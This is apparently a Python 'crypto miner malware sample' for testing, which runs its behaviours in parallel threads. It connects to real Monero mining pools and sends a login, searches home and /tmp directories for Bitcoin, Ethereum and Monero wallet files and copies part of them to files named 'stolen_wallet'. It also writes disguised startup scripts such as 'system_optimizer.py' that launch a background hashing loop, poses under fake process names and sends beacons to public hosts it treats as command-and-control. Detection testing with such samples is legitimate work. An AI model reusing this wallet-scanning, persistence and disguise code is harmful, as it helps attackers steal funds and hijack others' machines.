#!/usr/bin/env python3
"""
Crypto Miner Malware Sample
Simulates cryptocurrency mining malware behavior
WARNING: This is for testing purposes only!
"""

import os
import subprocess
import threading
import time
import random
import hashlib
import socket
import json
from urllib.request import urlopen, Request
from urllib.error import URLError

def simulate_mining_activity():
    """Simulate CPU-intensive mining operations"""
    print("[CRYPTO-MINER] Starting mining operations...")
    
    # Simulate mining pool connections
    mining_pools = [
        ("pool.minergate.com", 45560),
        ("xmr-usa-east1.nanopool.org", 14444),
        ("pool.supportxmr.com", 443),
        ("mine.moneropool.com", 80)
    ]
    
    for pool_host, pool_port in mining_pools:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((pool_host, pool_port))
            if result == 0:
                print(f"[CRYPTO-MINER] Connected to mining pool {pool_host}:{pool_port}")
                
                # Send fake mining data
                mining_data = {
                    "method": "login",
                    "params": {
                        "login": "4" + "0" * 94,  # Fake Monero address
                        "pass": "x",
                        "agent": "xmr-stak/2.10.8"
                    },
                    "id": 1
                }
                sock.send(json.dumps(mining_data).encode() + b'\n')
                response = sock.recv(1024)
                print(f"[CRYPTO-MINER] Pool response: {response[:50]}...")
            else:
                print(f"[CRYPTO-MINER] Failed to connect to {pool_host}:{pool_port}")
            sock.close()
        except Exception as e:
            print(f"[CRYPTO-MINER] Mining pool error {pool_host}: {e}")

def simulate_hash_computation():
    """Simulate intensive hash computation (mining simulation)"""
    print("[CRYPTO-MINER] Starting hash computation...")
    
    # Simulate mining by computing many hashes
    hash_count = 0
    start_time = time.time()
    
    while time.time() - start_time < 10:  # Mine for 10 seconds
        # Simulate mining hash computation
        nonce = random.randint(0, 2**32)
        data = f"block_data_{nonce}_{time.time()}".encode()
        
        # Compute multiple hash rounds (like mining)
        hash_result = data
        for _ in range(1000):  # Simulate mining difficulty
            hash_result = hashlib.sha256(hash_result).digest()
        
        hash_count += 1000
        
        if hash_count % 50000 == 0:
            print(f"[CRYPTO-MINER] Computed {hash_count} hashes...")
    
    print(f"[CRYPTO-MINER] Mining complete: {hash_count} hashes in {time.time() - start_time:.2f}s")

def simulate_wallet_theft():
    """Simulate wallet file scanning and theft"""
    print("[CRYPTO-MINER] Scanning for wallet files...")
    
    # Common wallet file locations and names
    wallet_paths = [
        "~/.bitcoin/wallet.dat",
        "~/.ethereum/keystore",
        "~/.monero/wallet",
        "~/Library/Application Support/Bitcoin/wallet.dat",
        "~/AppData/Roaming/Bitcoin/wallet.dat",
        "/tmp/wallet.dat",
        "/tmp/ethereum_keystore"
    ]
    
    wallet_extensions = ['.dat', '.wallet', '.key', '.json']
    
    for wallet_path in wallet_paths:
        expanded_path = os.path.expanduser(wallet_path)
        try:
            if os.path.exists(expanded_path):
                print(f"[CRYPTO-MINER] Found wallet file: {expanded_path}")
                # Simulate copying wallet file
                backup_path = f"/tmp/stolen_wallet_{random.randint(1000, 9999)}.backup"
                with open(expanded_path, 'rb') as src, open(backup_path, 'wb') as dst:
                    dst.write(src.read()[:1024])  # Copy first 1KB
                print(f"[CRYPTO-MINER] Copied wallet to: {backup_path}")
            else:
                print(f"[CRYPTO-MINER] Wallet not found: {expanded_path}")
        except Exception as e:
            print(f"[CRYPTO-MINER] Wallet access error {expanded_path}: {e}")
    
    # Scan common directories for wallet files
    scan_dirs = ["/tmp", os.path.expanduser("~")]
    for scan_dir in scan_dirs:
        try:
            for root, dirs, files in os.walk(scan_dir):
                for file in files[:10]:  # Limit scan
                    if any(file.endswith(ext) for ext in wallet_extensions):
                        full_path = os.path.join(root, file)
                        print(f"[CRYPTO-MINER] Potential wallet file: {full_path}")
                        # Simulate analysis
                        try:
                            with open(full_path, 'rb') as f:
                                header = f.read(32)
                                if b'wallet' in header.lower() or b'bitcoin' in header.lower():
                                    print(f"[CRYPTO-MINER] Confirmed wallet file: {full_path}")
                        except:
                            pass
        except Exception as e:
            print(f"[CRYPTO-MINER] Directory scan error {scan_dir}: {e}")

def simulate_system_hijacking():
    """Simulate system resource hijacking"""
    print("[CRYPTO-MINER] Hijacking system resources...")
    
    # Try to set high CPU priority
    try:
        os.system("renice -n -20 $$")  # Try to set highest priority
        print("[CRYPTO-MINER] Set high CPU priority")
    except:
        print("[CRYPTO-MINER] Failed to set CPU priority")
    
    # Simulate GPU detection and hijacking
    gpu_commands = [
        "nvidia-smi --query-gpu=name --format=csv,noheader",
        "lspci | grep VGA",
        "system_profiler SPDisplaysDataType",
        "wmic path win32_VideoController get name"
    ]
    
    for cmd in gpu_commands:
        try:
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=3)
            if result.stdout:
                print(f"[CRYPTO-MINER] GPU detected: {result.stdout.strip()[:100]}")
                # Simulate GPU mining setup
                print("[CRYPTO-MINER] Configuring GPU mining...")
                break
        except:
            pass
    
    # Simulate memory allocation for mining
    try:
        large_buffer = bytearray(100 * 1024 * 1024)  # 100MB
        for i in range(0, len(large_buffer), 4096):
            large_buffer[i:i+8] = b"MINING!!"
        print(f"[CRYPTO-MINER] Allocated {len(large_buffer)} bytes for mining")
    except MemoryError:
        print("[CRYPTO-MINER] Memory allocation failed")

def simulate_persistence_and_stealth():
    """Simulate persistence mechanisms and stealth techniques"""
    print("[CRYPTO-MINER] Establishing persistence...")
    
    # Create startup scripts
    startup_locations = [
        "/tmp/.mine_startup.sh",
        f"{os.path.expanduser('~')}/.mining_daemon",
        "/tmp/system_optimizer.py"  # Disguised name
    ]
    
    mining_script = '''#!/bin/bash
# System Performance Optimizer (disguised miner)
nohup python3 -c "
import time, hashlib, random
while True:
    data = str(random.randint(0, 999999)).encode()
    for _ in range(10000):
        hashlib.sha256(data).hexdigest()
    time.sleep(1)
" &
'''
    
    for location in startup_locations:
        try:
            with open(location, 'w') as f:
                f.write(mining_script)
            os.chmod(location, 0o755)
            print(f"[CRYPTO-MINER] Created persistence script: {location}")
        except Exception as e:
            print(f"[CRYPTO-MINER] Failed to create {location}: {e}")
    
    # Simulate process name obfuscation
    try:
        fake_names = ["system_update", "security_scan", "disk_cleanup", "performance_monitor"]
        fake_name = random.choice(fake_names)
        print(f"[CRYPTO-MINER] Masquerading as: {fake_name}")
        
        # Create fake process info
        with open(f"/tmp/{fake_name}.log", "w") as f:
            f.write(f"Process {fake_name} started at {time.ctime()}\n")
            f.write("Optimizing system performance...\n")
        
    except Exception as e:
        print(f"[CRYPTO-MINER] Stealth setup failed: {e}")

def simulate_c2_communication():
    """Simulate command and control communication"""
    print("[CRYPTO-MINER] Establishing C2 communication...")
    
    c2_servers = [
        "pastebin.com",
        "httpbin.org",
        "ipinfo.io",
        "api.github.com"
    ]
    
    for server in c2_servers:
        try:
            # Simulate beacon/checkin
            req = Request(f"https://{server}", headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            with urlopen(req, timeout=5) as response:
                data = response.read()
                print(f"[CRYPTO-MINER] C2 beacon sent to {server}")
                
                # Simulate receiving mining configuration
                if server == "httpbin.org":
                    print("[CRYPTO-MINER] Received mining configuration update")
                elif server == "pastebin.com":
                    print("[CRYPTO-MINER] Downloaded new mining pool list")
                
        except URLError as e:
            print(f"[CRYPTO-MINER] C2 communication failed {server}: {e}")
        except Exception as e:
            print(f"[CRYPTO-MINER] C2 error {server}: {e}")

def main():
    """Main crypto miner execution"""
    print(f"[CRYPTO-MINER] Crypto mining malware started - PID {os.getpid()}")
    print("[CRYPTO-MINER] Initializing mining operations...")
    
    # Run mining operations in parallel
    operations = [
        simulate_mining_activity,
        simulate_hash_computation,
        simulate_wallet_theft,
        simulate_system_hijacking,
        simulate_persistence_and_stealth,
        simulate_c2_communication
    ]
    
    threads = []
    for op in operations:
        thread = threading.Thread(target=op)
        thread.start()
        threads.append(thread)
        time.sleep(0.5)
    
    # Wait for all operations
    for thread in threads:
        thread.join()
    
    print("[CRYPTO-MINER] All mining operations completed")
    print("[CRYPTO-MINER] Miner running in background...")

if __name__ == "__main__":
    main()